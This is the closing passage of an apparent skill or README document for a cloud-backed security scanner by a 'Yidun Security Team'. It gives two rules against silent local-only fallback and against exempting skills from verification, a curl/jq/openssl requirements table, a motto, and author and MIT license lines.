- ❌ Do NOT silently fall back to local-only on timeout without notifying the user
- ❌ Do NOT treat any skill type as exempt from cloud verification when cloud is enabled

---

## Requirements

| Tool | Purpose |
|------|---------|
| `curl` | Cloud API communication |
| `jq` | Parse JSON responses |
| `openssl` | File hash computation |

---

*Scan first, install later.* ⚡

**Author**: Yidun Security Team
**License**: MIT